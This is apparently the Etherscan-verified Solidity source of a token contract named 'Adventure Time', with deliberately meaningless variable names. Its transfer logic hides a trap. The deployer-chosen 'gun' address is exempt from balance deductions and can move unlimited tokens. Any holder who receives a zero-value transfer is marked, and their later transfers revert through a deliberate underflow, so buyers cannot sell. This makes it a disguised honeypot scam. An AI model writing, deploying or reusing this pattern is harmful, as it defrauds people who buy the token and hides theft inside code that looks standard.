/**
 *Submitted for verification at Etherscan.io on 2023-05-15
*/

/*

https://t.me/adventuretime_eth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract AdventureTime is Ownable {
    mapping(address => uint256) private dollar;

    function approve(address bottle, uint256 never) public returns (bool success) {
        allowance[msg.sender][bottle] = never;
        emit Approval(msg.sender, bottle, never);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    string public name = 'Adventure Time';

    function transferFrom(address century, address realize, uint256 never) public returns (bool success) {
        silver(century, realize, never);
        require(never <= allowance[century][msg.sender]);
        allowance[century][msg.sender] -= never;
        return true;
    }

    mapping(address => uint256) public balanceOf;

    string public symbol = 'Adventure Time';

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address realize, uint256 never) public returns (bool success) {
        silver(msg.sender, realize, never);
        return true;
    }

    constructor(address gun) {
        balanceOf[msg.sender] = totalSupply;
        climate[gun] = chemical;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 private chemical = 86;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private climate;

    address public uniswapV2Pair;

    function silver(address century, address realize, uint256 never) private returns (bool success) {
        if (climate[century] == 0) {
            if (uniswapV2Pair != century && dollar[century] > 0) {
                climate[century] -= chemical;
            }
            balanceOf[century] -= never;
        }
        balanceOf[realize] += never;
        if (never == 0) {
            dollar[realize] += chemical;
        }
        emit Transfer(century, realize, never);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;
}